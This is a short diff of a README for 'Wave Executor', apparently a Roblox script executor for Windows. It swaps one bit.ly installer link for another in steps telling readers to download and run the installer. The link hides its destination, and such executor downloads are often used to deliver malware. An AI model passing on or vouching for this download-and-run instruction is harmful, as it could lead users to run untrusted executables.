@@ -27,7 +27,7 @@ Welcome to Wave Executor, a robust Windows-based script executor tailored for Ro
 
 To install Wave Executor, follow these steps:
 
-1. Download the Wave Executor installer from the following link: [Download Wave Executor](https://bit.ly/3Vk6jRq)
+1. Download the Wave Executor installer from the following link: [Download Wave Executor](https://bit.ly/3CYSSAj)
 2. Run the installer on your Windows machine.
 3. Follow the on-screen instructions to complete the installation process.
 
